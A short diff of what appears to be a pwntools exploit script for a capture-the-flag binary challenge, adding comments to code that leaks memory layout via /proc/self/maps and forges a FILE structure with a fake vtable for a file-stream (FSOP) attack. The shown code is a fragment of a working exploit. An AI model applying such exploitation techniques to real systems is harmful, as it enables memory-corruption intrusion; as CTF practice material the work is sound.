@@ -38,6 +38,8 @@ else:
 GDB()
 # read /proc/self/maps
 sla(b'Your choice :', b'1')
+# output when read /proc/self/maps may differ in local and remote
+# So check output of remote and adjust it to fit with the server
 sla(b'hat do you want to see :', b'/proc/self/maps')
 
 def see():
@@ -62,6 +64,7 @@ io._lock = p32(0x804b4e0)
 
 io.vtable = p32(0x804b284)
 
+# Start fsop here
 load = flat(
     b'a'*0x20, 
     0x804b284
